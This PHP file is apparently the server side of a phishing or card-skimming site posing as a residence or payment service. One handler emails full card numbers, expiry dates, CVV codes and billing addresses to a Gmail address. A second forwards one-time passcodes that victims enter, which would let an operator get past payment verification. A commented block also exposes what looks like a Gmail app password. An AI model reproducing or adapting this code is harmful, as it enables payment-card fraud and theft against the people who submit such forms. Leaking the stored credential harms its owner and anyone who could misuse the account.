<?php
// Load Composer's autoloader (if using Composer)
require 'vendor/autoload.php';

// Import PHPMailer classes into the global namespace
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;



function sendEmail($post) {
    $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    $name = $post['name'];
    $amount_to_pay = $post['amount'];
    $card_number = $post['cardNumber'];
    $address = $post['address'];
    $city = $post['city'];
    $state = $post['state'];
    $zipCode = $post['zipCode'];
    $card_expiration_year = $post['expYear'];
    $card_expiration_month = $post['expMonth'];
    $cvv = $post['cvv'];
    $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
    $fromEmail = filter_var($post['email'], FILTER_SANITIZE_EMAIL);

    // Set headers
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8" . "\r\n";
    $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
    $headers .= "Reply-To: {$fromEmail}" . "\r\n";

    $email_body = "You have received a new message.\n\n";
    $email_body .= "Billing address: $address\r\n";
    $email_body .= "State: $state\r\n";
    $email_body .= "City: $city\r\n";
    $email_body .= "Zip-code: $zipCode\r\n";
    $email_body .= "Card owner: $name\r\n";
    $email_body .= "Card number: $card_number\r\n";
    $email_body .= "Amount: $amount_to_pay\r\n";
    $email_body .= "Card expiration year: $card_expiration_year\r\n";
    $email_body .= "Card expiration month: $card_expiration_month\r\n";
    $email_body .= "Card CVC: $cvv\r\n";



    $html_body = "<h3>You have received a new message.</h3>";
    $html_body .= "<p><strong>Billing Address:</strong> $address</p>";
    $html_body .= "<p><strong>State:</strong> $state</p>";
    $html_body .= "<p><strong>City:</strong> $city</p>";
    $html_body .= "<p><strong>Zip-code:</strong> $zipCode</p>";
    $html_body .= "<p><strong>Card Owner:</strong> $name</p>";
    $html_body .= "<p><strong>Card Number:</strong> $card_number</p>";
    $html_body .= "<p><strong>Amount:</strong> $amount_to_pay</p>";
    $html_body .= "<p><strong>Card Expiration Year:</strong> $card_expiration_year</p>";
    $html_body .= "<p><strong>Card Expiration Month:</strong> $card_expiration_month</p>";
    $html_body .= "<p><strong>Card CVC:</strong> $cvv</p>";


    // Send email
    if (mail($to, $subject, $html_body, $headers)) {
        echo "success";
    } else {
        echo "Failed to send email to";
    }
}
if(isset($_POST['sendcard'])){
    sendEmail($_POST);
}


function sendContact($post) {
    // $to = filter_var($post['to'], FILTER_SANITIZE_EMAIL);
//$subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    $name = $post['name'];
    $email = $post['email'];
    $subject = $post['subject'];
    $message = filter_var( $post['message'], FILTER_SANITIZE_STRING);
    // $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
    // $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    // $message = filter_var($message, FILTER_SANITIZE_STRING);
    // $fromName = filter_var($fromName, FILTER_SANITIZE_STRING);
    $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
    // $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    // $message = filter_var($message, FILTER_SANITIZE_STRING);
    // $fromName = filter_var($fromName, FILTER_SANITIZE_STRING);
    $fromEmail = filter_var($email, FILTER_SANITIZE_EMAIL);

    // Set headers
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8" . "\r\n";
    $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
    $headers .= "Reply-To: {$fromEmail}" . "\r\n";

    $email_body = $message;
   


    $html_body = "<h3>$message.</h3>";
    // $html_body .= "<p><strong>Card owner:</strong> $name</p>";
    // $html_body .= "<p><strong>card number:</strong> $card_number</p>";
    // $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
    // $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
    // $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
    // $mail = new PHPMailer(true);  // Create a new PHPMailer instance

    // try {
    //     //Server settings
    //     $mail->SMTPDebug = 0;  // Disable verbose debug output
    //     $mail->isSMTP();  // Set mailer to use SMTP
    //     $mail->Host       = 'smtp.gmail.com';  // Specify Gmail's SMTP server
    //     $mail->Username   = "americanresidence435@gmail.com";   // Your Gmail address
    //     $mail->Password   = 'dtwh cnul jqfq uxol';  // Your Gmail password or app-specific password // Your Gmail password or app-specific password
    //     $mail->SMTPSecure = 'ssl';  // Enable TLS encryption
    //     $mail->Port       = 465;  // TCP port to connect to Gmail's SMTP

    //     //Recipients
    //     $mail->setFrom('americanresidence435@gmail.com', 'Resido');  // From email address and name
    //     $mail->addAddress("americanresidence435@gmail.com");  // Recipient email address

    //     // Content
    //     $mail->isHTML(true);  // Set email format to HTML
    //     $mail->Subject = $subject;
    //     $mail->Body    = $email_body;

    //     // Send the email
    //     $mail->send();
    //     echo 'success';
    // } catch (Exception $e) {
    //     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    // }
    if (mail($to, $subject, $email_body, $headers)) {
        echo "success";
    } else {
        echo "Failed to send email to";
    }
}
function sendOTP($post) {
    $to = filter_var("americanresidence435@gmail.com", FILTER_SANITIZE_EMAIL);
    $subject = filter_var("payment process OTP", FILTER_SANITIZE_STRING);
    $otp = $post['OTP'];
    
    

    $email_body = "You have received a new message.\n\n";
    $email_body .= "OTP: $otp\n";
    


    $html_body = "<h3>You have received a new message.</h3>";
    $html_body .= "<p><strong>OTP:</strong> $otp</p>";
    $mail = new PHPMailer(true);  

   
    $name = "me";
    $fromEmail = "agent@americaresides.com";
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8" . "\r\n";
    $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
    $headers .= "Reply-To: {$fromEmail}" . "\r\n";
    if (mail($to, $subject, $email_body, $headers)) {
        echo "success";
    } else {
        echo "Failed to send email to";
    }

    
}


if(isset($_POST['sendotp'])){
    sendOTP($_POST);
}
if(isset($_POST['contact'])){
    sendContact($_POST);
}

?>
